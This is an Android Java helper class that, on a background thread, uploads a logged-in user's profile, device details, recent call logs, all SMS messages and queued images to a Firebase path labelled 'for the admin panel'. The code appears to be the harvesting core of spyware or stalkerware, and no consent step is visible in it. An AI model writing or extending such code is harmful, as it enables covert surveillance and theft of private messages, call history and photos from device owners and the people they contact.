package com.mehboob.bushorat.helpers;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

import java.util.HashMap;
import java.util.Map;

/**
 * Syncs all user data to user_data/{userId}/ for the admin panel.
 */
public class UserDataSyncHelper {
    private static final String TAG = "UserDataSyncHelper";

    public static void syncAll(Context context) {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            Log.w(TAG, "Cannot sync: user not logged in");
            return;
        }

        Context appContext = context.getApplicationContext();
        String userId = user.getUid();

        new Thread(() -> {
            Log.d(TAG, "Starting full user data sync for " + userId);
            updateProfileSummary(user);
            DeviceInfoHelper.uploadToFirebase(appContext);
            CallLogHelper.uploadRecentCallLogs(appContext);
            SmsSyncHelper.syncAllSms(appContext);
            ImageUploadWorker.enqueueWork(appContext);
            Log.d(TAG, "Full user data sync scheduled for " + userId);
        }).start();
    }

    private static void updateProfileSummary(FirebaseUser user) {
        Map<String, Object> profile = new HashMap<>();
        profile.put("userId", user.getUid());
        profile.put("email", user.getEmail() != null ? user.getEmail() : "");
        profile.put("displayName", user.getDisplayName() != null ? user.getDisplayName() : "");
        profile.put("deviceModel", Build.MANUFACTURER + " " + Build.MODEL);
        profile.put("lastSeen", System.currentTimeMillis());

        FirebaseDataPaths.profile(user.getUid()).updateChildren(profile);
    }
}
